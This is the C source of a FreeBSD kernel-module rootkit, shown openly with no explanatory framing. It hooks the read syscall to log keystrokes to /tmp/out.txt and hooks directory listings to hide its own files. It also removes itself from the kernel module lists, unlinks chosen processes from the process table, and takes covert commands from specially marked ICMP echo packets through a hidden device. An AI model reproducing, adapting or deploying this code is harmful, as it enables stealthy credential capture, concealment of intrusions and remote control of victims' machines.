#include <sys/fcntl.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/pcpu.h>
#include <sys/syscallsubr.h>
#include <sys/file.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>
#include <sys/linker.h>
#include <sys/libkern.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_var.h>
#include <sys/mbuf.h>
#include <sys/protosw.h>
#include <sys/conf.h>
#include <sys/uio.h>
#include <sys/ioccom.h>


#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>

char *T_NAME[] = {"hidden.ko", "loader.conf", "out.txt"};

d_open_t topen;
d_close_t tclose;
d_read_t tread;
d_write_t twrite;


#define MODULE_NAME "hidden"
#define FILE_NAME "hidden.ko"

extern linker_file_list_t linker_files;
extern struct sx kld_sx;

extern int next_file_id;
#define    LINKER_GET_NEXT_FILE_ID(a) do {          \
    linker_file_t lftmp;                            \
                                                    \
    if (!cold)                                      \
        sx_assert(&kld_sx, SA_XLOCKED);             \
retry:                                              \
    TAILQ_FOREACH(lftmp, &linker_files, link) {     \
        if (next_file_id == lftmp->id) {            \
            next_file_id++;                         \
            goto retry;                             \
        }                                           \
    }                                               \
    (a) = next_file_id;                             \
} while(0)


typedef TAILQ_HEAD(, module) modulelist_t;
extern modulelist_t modules;
extern int nextid;
struct module {
    TAILQ_ENTRY(module)    link;    
    TAILQ_ENTRY(module)    flink;    
    struct linker_file    *file;   
    int            refs;    
    int             id;   
    char             *name;    
    modeventhand_t         handler;    
    void                *arg;    
    modspecific_t        data;    
};

static int activate = 0;
static int last_kld = -1;

static struct linker_file *save_lf;
static struct module *save_mod;

int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td);
int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td);
int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td);
int dev_write(struct cdev *dev, struct uio *uio, int ioflag);
int dev_read(struct cdev *dev, struct uio *uio, int ioflag);


#define APP_NAME "__icmpshell"

static char cmd[256+1];
static struct sx cmd_lock;

#define VERBOSE 0 

extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

int dev_open(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int dev_close(struct cdev *dev, int flag, int otyp, struct thread *td)
{
    return 0;
}

int dev_ioctl(struct cdev *dev, u_long cmd, caddr_t arg, int mode,struct thread *td)
{
    return 0;
}


int dev_write(struct cdev *dev, struct uio *uio, int ioflag)
{
    return 0;
}

static int hide_kld(void)
{
    struct linker_file *lf;
    struct module *mod;
    
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);
    
    if ((&linker_files)->tqh_first->refs > 2)
        (&linker_files)->tqh_first->refs -= 2;
    
    TAILQ_FOREACH(lf, &linker_files, link)
    {
        if (strcmp(lf->filename, FILE_NAME) == 0)
        {
            if (next_file_id == lf->id)
                last_kld = 1;
            else
                last_kld = 0;
            
            save_lf = lf;
            
            if (last_kld)
                next_file_id--;
            
            TAILQ_REMOVE(&linker_files, lf, link);
            break;
        }
    }
    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    MOD_XLOCK;
    TAILQ_FOREACH(mod, &modules, link)
    {
        if (strcmp(mod->name, "sys/hidden") == 0)
        {
            save_mod = mod;
            if (last_kld)
                nextid--;
            TAILQ_REMOVE(&modules, mod, link);
            break;
        }
    }
    MOD_XUNLOCK;
    
    return 0;
}

static int unhide_kld(void)
{
    if (!save_lf)
        return -1;
    
    mtx_lock(&Giant);
    sx_xlock(&kld_sx);
    
    (&linker_files)->tqh_first->refs += 2;
    
    LINKER_GET_NEXT_FILE_ID(save_lf->id);
    
    TAILQ_INSERT_TAIL(&linker_files, save_lf, link);
    
    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    if (!save_mod)
        return -1;
    
    MOD_XLOCK;
    
    save_mod->id = nextid++;
    TAILQ_INSERT_TAIL(&modules, save_mod, link);
    
    MOD_XUNLOCK;
    
    save_lf = 0;
    save_mod = 0;
    
    return 0;
}


struct hiding_funct_args{
    char *p_comm;
};


static int hiding_funct(struct thread *thread, void *args) {
    struct hiding_funct_args *uap;
    uap = (struct hiding_funct_args *)args;
    struct proc *p;
    sx_xlock(&allproc_lock);
    
    LIST_FOREACH(p, &allproc, p_list) { 
        PROC_LOCK(p);
        if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
            PROC_UNLOCK(p);
            continue;
        }
        if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) {
            LIST_REMOVE(p, p_list);
            LIST_REMOVE(p, p_hash);
        }
        PROC_UNLOCK(p);
    }
    sx_xunlock(&allproc_lock);
    return(0);
}



static int writetofile(struct thread *td, char c){
    int error = kern_openat(td, AT_FDCWD, "/tmp/out.txt", UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (error){
        uprintf("open error %d\n", error);
        return(error);
    }
    int buf[1] = {c};
    int keylog_fd = td->td_retval[0];
    struct iovec aiov;
    struct uio auio;
    bzero(&auio, sizeof(auio));
    bzero(&aiov, sizeof(aiov));
    
    aiov.iov_base = &buf;
    aiov.iov_len = 1;
    auio.uio_iov = &aiov;
    auio.uio_iovcnt = 1;
    auio.uio_offset = 0;
    auio.uio_resid = 1;
    auio.uio_segflg = UIO_SYSSPACE;
    auio.uio_rw = UIO_WRITE;
    auio.uio_td = td;
    
    error = kern_writev(td, keylog_fd, &auio);
    if (error){
        uprintf("write error %d\n", error);
        return error;
    }
    struct close_args fdtmp;
    fdtmp.fd = keylog_fd;
    sys_close(td, &fdtmp);
    return(error);
}

static int read_hook(struct thread *td, void *syscall_args){
    struct read_args *uap;
    uap = (struct read_args *) syscall_args;
    int error;
    char bu[1024];
    int done;
    
    error = sys_read(td, syscall_args);
    if (error || (!uap->nbyte) || (uap->nbyte > 1)){
        return(error);
    }
    copyinstr(uap->buf, bu, 1, &done);
    writetofile(td, bu[0]);
    return(error);
}


static int
getdirentries_hook(struct thread *td, void *syscall_args)
{
    struct getdirentries_args  *uap;
    uap = (struct getdirentries_args *)syscall_args;
    
    struct dirent *dp, *current;
    unsigned int size, count;
    

    sys_getdirentries(td, syscall_args);
    size = td->td_retval[0];
    
    if (size > 0) {
        MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
        copyin(uap->buf, dp, size);
        
        current = dp;
        count = size;

        while ((current->d_reclen != 0) && (count > 0)) {
            count -= current->d_reclen;
            
            if(strcmp((char *)&(current->d_name), T_NAME[0]) == 0 || strcmp((char *)&(current->d_name), T_NAME[1])==0 || strcmp((char *)&(current->d_name), T_NAME[2])==0) {
                if (count != 0)
                    bcopy((char *)current +
                          current->d_reclen, current,
                          count);
                
                size -= current->d_reclen;
                break;
            }
            

            if (count != 0)
                current = (struct dirent *)((char *)current +
                                            current->d_reclen);
        }
        

        td->td_retval[0] = size;
        copyout(dp, uap->buf, size);
        
        FREE(dp, M_TEMP);
    }
    return(0);
}


int dev_read(struct cdev *dev, struct uio *uio, int ioflag)
{
    int len;
    
    sx_xlock(&cmd_lock);
    copystr(&cmd, uio->uio_iov->iov_base, strlen(cmd)+1, &len);
    
    bzero(cmd,256);
    sx_xunlock(&cmd_lock);
    
#if VERBOSE
    printf("Rootkit: read %d bytes from device\n",len);
#endif
    
    return 0;
}

static struct cdevsw devsw = {
         .d_version = D_VERSION,
         .d_open = dev_open,
         .d_close = dev_close,
         .d_read = dev_read,
         .d_write = dev_write,
         .d_ioctl = dev_ioctl,
         .d_name = "ubi_65"
};
static struct cdev *sdev;

static void decharge(){
    if (activate == 1){
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
        sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
        sx_destroy(&cmd_lock);
        inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
        destroy_dev(sdev);
        unhide_kld();
        activate = 0;
    }
}


int icmp_input_hook(struct mbuf **m, int *off, int proto)
{

    struct icmp *icmp_header;
    char str[256+1];
    int len,cnt;
    
    (*m)->m_len -= *off;
    (*m)->m_data += *off;
    
    icmp_header = mtod(*m, struct icmp *);
    
    (*m)->m_len += *off;
    (*m)->m_data -= *off;
    
    if (icmp_header->icmp_type == ICMP_ECHO)
    {
        bzero(str,256);
        copystr(icmp_header->icmp_data, str, 256, &len);
        
        if(strlen(str) > 2)
        {
            if(str[0] == '_' && str[1] == '_')
            {
                cnt = 2;
                
                sx_xlock(&cmd_lock);
                
                bzero(cmd,256);
                while(str[cnt] != ';' && cnt < 256)
                {
                    cmd[cnt-2] = str[cnt];
                    cnt++;
                }
                
                cmd[cnt] = '\0';
                sx_xunlock(&cmd_lock);
#if VERBOSE
#endif
            } else if (str[0]=='-' && str[1]=='-'){
                decharge();
            }
            
            else
            {
                return(icmp_input(m,off,proto));
            }
        }
        
        else
        {
            return(icmp_input(m,off,proto));
        }
    }
    
    else
    {
        return(icmp_input(m, off,proto));
    }
    
    return(icmp_input(m, off,proto));
}


struct sc_arg{
    char *option;
};

static int sc_func(struct thread *td, void *arg){
    struct sc_arg *uap;
    uap = (struct sc_arg *)arg;
    
    if (strcmp(uap->option, "on") == 0 && activate == 0)
    {
        
        sysent[SYS_read].sy_call = (sy_call_t *) read_hook;
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
        
        sx_init(&cmd_lock,"rootkit_lock");
        inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
        sdev = make_dev(&devsw, 0, UID_ROOT, GID_WHEEL, 0600, "ubi_65");
        
        hide_kld();
        activate = 1;
    }
    else if (strcmp(uap->option, "off") == 0 && activate == 1)
    {
        
        sysent[SYS_read].sy_call = (sy_call_t *) sys_read;
        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
        
        sx_destroy(&cmd_lock);
        inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
        destroy_dev(sdev);
        
        unhide_kld();
        activate = 0;
        
    }
    else {
        hiding_funct(td, arg);
    }
    
    
    return(0);
}

static struct sysent sc_sysent = {
    1,
    sc_func
};

static int offset = NO_SYSCALL;


static int load(struct module *module, int cmd, void *arg){
    
    int error = 0;
    
    switch (cmd) {
        case MOD_LOAD:
            break;
            
        case MOD_UNLOAD:
            break;
            
        default:
            error = EOPNOTSUPP;
            break;
    }
    
    return(error);
}


SYSCALL_MODULE(hidden, &offset, &sc_sysent, load, NULL);

